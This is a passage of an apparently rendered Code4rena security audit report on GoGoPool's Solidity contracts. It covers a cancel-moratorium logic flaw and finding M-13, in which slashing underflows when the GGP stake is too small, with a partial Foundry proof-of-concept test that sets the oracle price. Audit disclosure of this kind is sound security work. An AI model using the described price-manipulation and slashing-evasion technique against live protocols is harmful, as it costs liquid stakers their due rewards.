class=\"grvsc-line\"><span class=\"grvsc-source\">\t\tsetUint(keccak256(abi.encodePacked(&quot;minipool.item&quot;, minipoolIndex, &quot;.delegationFee&quot;)), delegationFee);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\tsetAddress(keccak256(abi.encodePacked(&quot;minipool.item&quot;, minipoolIndex, &quot;.owner&quot;)), msg.sender);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\tsetAddress(keccak256(abi.encodePacked(&quot;minipool.item&quot;, minipoolIndex, &quot;.multisigAddr&quot;)), multisig);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\tsetUint(keccak256(abi.encodePacked(&quot;minipool.item&quot;, minipoolIndex, &quot;.avaxNodeOpInitialAmt&quot;)), msg.value);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\tsetUint(keccak256(abi.encodePacked(&quot;minipool.item&quot;, minipoolIndex, &quot;.avaxNodeOpAmt&quot;)), msg.value);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\tsetUint(keccak256(abi.encodePacked(&quot;minipool.item&quot;, minipoolIndex, &quot;.avaxLiquidStakerAmt&quot;)), avaxAssignmentRequest);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\temit MinipoolStatusChanged(nodeID, MinipoolStatus.Prelaunch);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\tVault vault = Vault(getContractAddress(&quot;Vault&quot;));</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\tvault.depositAVAX{value: msg.value}();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t}</span></span></code></pre>\n<p><strong><a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/519\">emersoncloud (GoGoPool) confirmed</a></strong></p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/519#issuecomment-1398302235\">0xju1ie (GoGoPool) commented</a>:</strong></p>\n<blockquote>\n<p>This solution would mess up other aspects of the protocol. In cancel minipool, we should really just check the minipoolStartTime against the cancelMoratoriumSeconds. </p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/519#issuecomment-1407750433\">Alex the Entreprenerd (judge) commented</a>:</strong></p>\n<blockquote>\n<p>The warden has shown a logic flaw in the Finite State Machine, as shown in the POC, cancelling a second miniPool can be done before <code>MinipoolCancelMoratoriumSeconds</code>.</p>\n<p>Because the exploit doesn’t demonstrate a reliable way to extra value or funds from the protocol, I agree with Medium Severity.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-02-gogopool-mitigation-contest#mitigations-to-be-reviewed\">emersoncloud (GoGoPool) mitigated</a>:</strong></p>\n<blockquote>\n<p>Base cancelMinipool delay on minipool creation time not rewards start time: <a href=\"https://github.com/multisig-labs/gogopool/pull/40\">multisig-labs/gogopool#40</a></p>\n</blockquote>\n<p><strong>Status:</strong> Mitigation confirmed by <a href=\"https://github.com/code-423n4/2023-02-gogopool-mitigation-contest-findings/issues/17\">RaymondFam</a> and <a href=\"https://github.com/code-423n4/2023-02-gogopool-mitigation-contest-findings/issues/37\">hansfriese</a>.</p>\n<hr>\n<h2 id=\"m-13-slashing-fails-when-node-operator-doesnt-have-enough-staked-ggp\" style=\"position:relative;\"><a href=\"#m-13-slashing-fails-when-node-operator-doesnt-have-enough-staked-ggp\" aria-label=\"m 13 slashing fails when node operator doesnt have enough staked ggp permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/494\">[M-13] Slashing fails when node operator doesn’t have enough staked <code>GGP</code></a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/494\">immeas</a>, also found by <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/886\">HollaDieWaldfee</a>, <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/826\">datapunk</a>, <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/645\">wagmi</a>, <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/561\">yixxas</a>, <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/437\">ck</a>, <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/333\">cccz</a>, <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/278\">nameruse</a>, <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/183\">cozzetti</a>, <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/142\">0x73696d616f</a>, and <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/131\">koxuan</a></em></p>\n<p>When creating a minipool the node operator is required to put up a collateral in <code>GGP</code>, the protocol token. The amount of <code>GGP</code> collateral needed is currently calculated to be 10% of the <code>AVAX</code> staked. This is calculated using the price of <code>GGP - AVAX</code>.</p>\n<p>If the node operator doesn’t have high enough availability and doesn’t get any rewards the protocol will slash their <code>GGP</code> collateral to reward liquid stakers. This is also calculated using the price of <code>GGP - AVAX</code>:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"javascript\" data-index=\"59\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">MinipoolManager</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">547</span><span class=\"mtk1\">:\t</span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">calculateGGPSlashAmt</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">avaxRewardAmt</span><span class=\"mtk1\">) </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> </span><span class=\"mtk11\">view</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">548</span><span class=\"mtk1\">:\t\t</span><span class=\"mtk12\">Oracle</span><span class=\"mtk1\"> </span><span class=\"mtk12\">oracle</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">Oracle</span><span class=\"mtk1\">(</span><span class=\"mtk11\">getContractAddress</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;Oracle&quot;</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">549</span><span class=\"mtk1\">:\t\t(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ggpPriceInAvax</span><span class=\"mtk1\">, ) = </span><span class=\"mtk12\">oracle</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getGGPPriceInAVAX</span><span class=\"mtk1\">(); </span><span class=\"mtk3\">// price might change or be manipulated</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">550</span><span class=\"mtk1\">:\t\t</span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk12\">avaxRewardAmt</span><span class=\"mtk1\">.</span><span class=\"mtk11\">divWadDown</span><span class=\"mtk1\">(</span><span class=\"mtk12\">ggpPriceInAvax</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">551</span><span class=\"mtk1\">:\t}</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">670</span><span class=\"mtk1\">:\t</span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">slash</span><span class=\"mtk1\">(</span><span class=\"mtk12\">int256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">index</span><span class=\"mtk1\">) </span><span class=\"mtk11\">private</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">673</span><span class=\"mtk1\">:\t\t</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">duration</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">getUint</span><span class=\"mtk1\">(</span><span class=\"mtk11\">keccak256</span><span class=\"mtk1\">(</span><span class=\"mtk12\">abi</span><span class=\"mtk1\">.</span><span class=\"mtk11\">encodePacked</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;minipool.item&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk12\">index</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;.duration&quot;</span><span class=\"mtk1\">)));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">674</span><span class=\"mtk1\">:\t\t</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">avaxLiquidStakerAmt</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">getUint</span><span class=\"mtk1\">(</span><span class=\"mtk11\">keccak256</span><span class=\"mtk1\">(</span><span class=\"mtk12\">abi</span><span class=\"mtk1\">.</span><span class=\"mtk11\">encodePacked</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;minipool.item&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk12\">index</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;.avaxLiquidStakerAmt&quot;</span><span class=\"mtk1\">)));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">675</span><span class=\"mtk1\">:\t\t</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">expectedAVAXRewardsAmt</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">getExpectedAVAXRewardsAmt</span><span class=\"mtk1\">(</span><span class=\"mtk12\">duration</span><span class=\"mtk1\">, </span><span class=\"mtk12\">avaxLiquidStakerAmt</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">676</span><span class=\"mtk1\">:\t\t</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">slashGGPAmt</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">calculateGGPSlashAmt</span><span class=\"mtk1\">(</span><span class=\"mtk12\">expectedAVAXRewardsAmt</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">681</span><span class=\"mtk1\">:\t\t</span><span class=\"mtk12\">Staking</span><span class=\"mtk1\"> </span><span class=\"mtk12\">staking</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">Staking</span><span class=\"mtk1\">(</span><span class=\"mtk11\">getContractAddress</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;Staking&quot;</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">682</span><span class=\"mtk1\">:\t\t</span><span class=\"mtk12\">staking</span><span class=\"mtk1\">.</span><span class=\"mtk11\">slashGGP</span><span class=\"mtk1\">(</span><span class=\"mtk12\">owner</span><span class=\"mtk1\">, </span><span class=\"mtk12\">slashGGPAmt</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">683</span><span class=\"mtk1\">:\t}</span></span></span></code></pre>\n<p>This is then subtracted from their staked amount:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"javascript\" data-index=\"60\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">Staking</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">94</span><span class=\"mtk1\">: \t</span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">decreaseGGPStake</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">stakerAddr</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">) </span><span class=\"mtk11\">internal</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">95</span><span class=\"mtk1\">: \t\t</span><span class=\"mtk12\">int256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">stakerIndex</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">requireValidStaker</span><span class=\"mtk1\">(</span><span class=\"mtk12\">stakerAddr</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">96</span><span class=\"mtk1\">: \t\t</span><span class=\"mtk11\">subUint</span><span class=\"mtk1\">(</span><span class=\"mtk11\">keccak256</span><span class=\"mtk1\">(</span><span class=\"mtk12\">abi</span><span class=\"mtk1\">.</span><span class=\"mtk11\">encodePacked</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;staker.item&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk12\">stakerIndex</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;.ggpStaked&quot;</span><span class=\"mtk1\">)), </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">); </span><span class=\"mtk3\">// can fail due to underflow</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">97</span><span class=\"mtk1\">: \t}</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">379</span><span class=\"mtk1\">:\t</span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">slashGGP</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">stakerAddr</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ggpAmt</span><span class=\"mtk1\">) </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlySpecificRegisteredContract</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;MinipoolManager&quot;</span><span class=\"mtk1\">, msg.sender) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">380</span><span class=\"mtk1\">:\t\t</span><span class=\"mtk12\">Vault</span><span class=\"mtk1\"> </span><span class=\"mtk12\">vault</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">Vault</span><span class=\"mtk1\">(</span><span class=\"mtk11\">getContractAddress</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;Vault&quot;</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">381</span><span class=\"mtk1\">:\t\t</span><span class=\"mtk11\">decreaseGGPStake</span><span class=\"mtk1\">(</span><span class=\"mtk12\">stakerAddr</span><span class=\"mtk1\">, </span><span class=\"mtk12\">ggpAmt</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">382</span><span class=\"mtk1\">:\t\t</span><span class=\"mtk12\">vault</span><span class=\"mtk1\">.</span><span class=\"mtk11\">transferToken</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;ProtocolDAO&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk12\">ggp</span><span class=\"mtk1\">, </span><span class=\"mtk12\">ggpAmt</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">383</span><span class=\"mtk1\">:\t}</span></span></span></code></pre>\n<p>The issue is that the current staked amount is never checked so the <code>subUint</code> can fail due to underflow if the price has changed since the minipool was created/recreated.</p>\n<h3 id=\"impact-2\" style=\"position:relative;\"><a href=\"#impact-2\" aria-label=\"impact 2 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Impact</h3>\n<p>If a node operator doesn’t have enough collateral, possibly caused by price changes in <code>GGP</code> during slashing they evade slashing all together.</p>\n<p>It’s even possible for the node operator to foresee this and manipulate the price of <code>GGP</code> just prior to the period ending if they know that they are going to be slashed.</p>\n<h3 id=\"proof-of-concept-17\" style=\"position:relative;\"><a href=\"#proof-of-concept-17\" aria-label=\"proof of concept 17 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>PoC test in <code>MinipoolManager.t.sol</code>:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"javascript\" data-index=\"61\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">testRecordStakingEndWithSlashNotEnoughStake</span><span class=\"mtk1\">() </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">duration</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">365</span><span class=\"mtk1\"> </span><span class=\"mtk12\">days</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">depositAmt</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">1000</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">avaxAssignmentRequest</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">1000</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">validationAmt</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">depositAmt</span><span class=\"mtk1\"> + </span><span class=\"mtk12\">avaxAssignmentRequest</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span><span class=\"mtk12\">uint128</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ggpStakeAmt</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">100</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">; </span><span class=\"mtk3\">// just enough</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">startPrank</span><span class=\"mtk1\">(</span><span class=\"mtk12\">nodeOp</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span><span class=\"mtk12\">ggp</span><span class=\"mtk1\">.</span><span class=\"mtk11\">approve</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">staking</span><span class=\"mtk1\">), </span><span class=\"mtk12\">MAX_AMT</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span><span class=\"mtk12\">staking</span><span class=\"mtk1\">.</span><span class=\"mtk11\">stakeGGP</span><span class=\"mtk1\">(</span><span class=\"mtk12\">ggpStakeAmt</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span><span class=\"mtk12\">MinipoolManager</span><span class=\"mtk1\">.</span><span class=\"mtk12\">Minipool</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">mp1</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">createMinipool</span><span class=\"mtk1\">(</span><span class=\"mtk12\">depositAmt</span><span class=\"mtk1\">, </span><span class=\"mtk12\">avaxAssignmentRequest</span><span class=\"mtk1\">, </span><span class=\"mtk12\">duration</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">stopPrank</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">liqStaker1</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">getActorWithTokens</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;liqStaker1&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk12\">MAX_AMT</span><span class=\"mtk1\">, </span><span class=\"mtk12\">MAX_AMT</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">prank</span><span class=\"mtk1\">(</span><span class=\"mtk12\">liqStaker1</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span><span class=\"mtk12\">ggAVAX</span><span class=\"mtk1\">.</span><span class=\"mtk12\">depositAVAX</span><span class=\"mtk1\">{value: </span><span class=\"mtk12\">MAX_AMT</span><span class=\"mtk1\">}();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">prank</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">rialto</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span><span class=\"mtk12\">minipoolMgr</span><span class=\"mtk1\">.</span><span class=\"mtk11\">claimAndInitiateStaking</span><span class=\"mtk1\">(</span><span class=\"mtk12\">mp1</span><span class=\"mtk1\">.</span><span class=\"mtk12\">nodeID</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span><span class=\"mtk12\">bytes32</span><span class=\"mtk1\"> </span><span class=\"mtk12\">txID</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">keccak256</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;txid&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">prank</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">rialto</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span><span class=\"mtk12\">minipoolMgr</span><span class=\"mtk1\">.</span><span class=\"mtk11\">recordStakingStart</span><span class=\"mtk1\">(</span><span class=\"mtk12\">mp1</span><span class=\"mtk1\">.</span><span class=\"mtk12\">nodeID</span><span class=\"mtk1\">, </span><span class=\"mtk12\">txID</span><span class=\"mtk1\">, </span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span><span class=\"mtk11\">skip</span><span class=\"mtk1\">(</span><span class=\"mtk7\">2</span><span class=\"mtk1\"> </span><span class=\"mtk12\">weeks</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">prank</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">rialto</span><span class=\"mtk1\">)); </span><span class=\"mtk3\">// price changes just a bit</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span><span class=\"mtk12\">oracle</span><span class=\"mtk1\">.</span><span class=\"mtk11\">setGGPPriceInAVAX</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0.999</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">, </span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">prank</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">rialto</span><span 